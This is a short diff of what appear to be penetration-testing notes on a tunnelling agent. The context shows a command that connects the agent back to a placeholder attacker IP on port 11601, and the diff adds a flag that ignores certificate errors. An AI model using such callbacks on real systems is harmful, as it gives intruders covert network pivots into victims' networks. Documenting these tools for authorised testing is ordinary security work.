@@ -37,3 +37,7 @@ start
 ```
 ./agent -connect [ATTACKER_IP]:11601
 ```
+If cert issues:
+```
+-ignore-cert
+```
